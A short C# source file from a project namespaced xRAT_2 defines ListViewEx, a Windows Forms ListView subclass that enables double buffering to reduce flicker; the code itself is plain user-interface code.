using System.Windows.Forms;

namespace xRAT_2.Controls
{
    public partial class ListViewEx : ListView
    {
        public ListViewEx()
        {
            base.SetStyle(ControlStyles.OptimizedDoubleBuffer, true);
            this.DoubleBuffered = true;
        }
    }
}
